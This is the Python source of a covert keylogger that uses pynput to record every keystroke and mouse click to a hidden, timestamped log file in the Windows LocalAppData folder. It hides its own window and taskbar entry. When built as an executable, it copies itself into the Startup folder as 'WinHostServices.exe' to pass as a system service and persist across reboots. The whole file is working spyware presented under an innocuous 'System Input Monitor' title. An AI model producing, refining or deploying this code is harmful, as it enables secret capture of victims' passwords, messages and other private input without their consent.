import tkinter as tk
from tkinter import filedialog
import os
import threading
import time
import shutil  
import sys     
from datetime import datetime
from pynput import keyboard, mouse

class HighPerformanceLogger:
    def __init__(self, root):
        self.root = root
        
        # --- STEALTH LOGIC ---
        # withdraw() hides the window, overrideredirect(True) removes it from taskbar
        self.root.withdraw() 
        self.root.overrideredirect(True) 
        
        # --- SESSION-BASED FILENAME LOGIC ---
        # Ensures every restart/launch creates a unique new file
        self.session_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.default_filename = f"log_{self.session_time}.txt"
        
        # Default hidden path in Local AppData
        self.log_file = os.path.join(os.environ['LOCALAPPDATA'], self.default_filename)
        
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.is_logging = False
        
        # UI Setup (Kept in code, but window is hidden via withdraw)
        self.root.title("System Input Monitor (HDD Optimized)")
        self.root.geometry("600x450")
        
        self.info_label = tk.Label(root, text=f"File: {self.default_filename}", fg="blue", font=("Arial", 10, "bold"))
        self.info_label.pack(pady=10)
        
        self.path_btn = tk.Button(root, text="Browse Folder", command=self.set_path, width=20)
        self.path_btn.pack()

        self.status_label = tk.Label(root, text="Status: ACTIVE", fg="red")
        self.status_label.pack(pady=5)

        self.log_display = tk.Text(root, height=15, width=70, state='disabled', bg="#222", fg="#0f0")
        self.log_display.pack(padx=10, pady=10)

        # Background Thread for Disk Writing
        self.flush_thread = threading.Thread(target=self.periodic_flush, daemon=True)
        self.flush_thread.start()

        # Execute Startup and Logging
        self.add_to_startup()
        self.start_logging() 

    def add_to_startup(self):
        """Copies the .exe to the Windows Startup folder with a generic name."""
        if getattr(sys, 'frozen', False): 
            file_path = sys.executable
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            # Renamed to look like a standard system service
            dest_path = os.path.join(startup_folder, "WinHostServices.exe")

            if not os.path.exists(dest_path):
                try:
                    shutil.copyfile(file_path, dest_path)
                except:
                    pass 

    def set_path(self):
        # Even if hidden, this remains for manual config if window is later deiconified
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            initialfile=self.default_filename,
            title="Select where to save logs"
        )
        if file_path:
            self.log_file = file_path

    def log_to_buffer(self, entry):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_entry = f"[{timestamp}] {entry}\n"
        
        with self.buffer_lock:
            self.buffer.append(formatted_entry)
        
        # Only update UI if the window is actually visible
        if self.root.state() == 'normal':
            self.root.after(0, self.update_ui, formatted_entry)

    def update_ui(self, message):
        self.log_display.config(state='normal')
        self.log_display.insert(tk.END, message)
        self.log_display.see(tk.END)
        self.log_display.config(state='disabled')

    def periodic_flush(self):
        while True:
            time.sleep(30) 
            self.write_to_disk()

    def write_to_disk(self):
        if not self.log_file or not self.buffer:
            return
        
        with self.buffer_lock:
            data_to_write = "".join(self.buffer)
            self.buffer = [] 
        
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(data_to_write)
        except:
            pass

    def on_press(self, key):
        try:
            self.log_to_buffer(f"KEY: {key.char}")
        except AttributeError:
            self.log_to_buffer(f"KEY: [{key}]")

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.log_to_buffer(f"MOUSE: Click at ({x}, {y})")

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            k_listener = keyboard.Listener(on_press=self.on_press)
            m_listener = mouse.Listener(on_click=self.on_click)
            k_listener.start()
            m_listener.start()

if __name__ == "__main__":
    root = tk.Tk()
    app = HighPerformanceLogger(root)
    
    def final_save():
        app.write_to_disk()
        root.destroy()
        
    root.protocol("WM_DELETE_WINDOW", final_save)
    root.mainloop()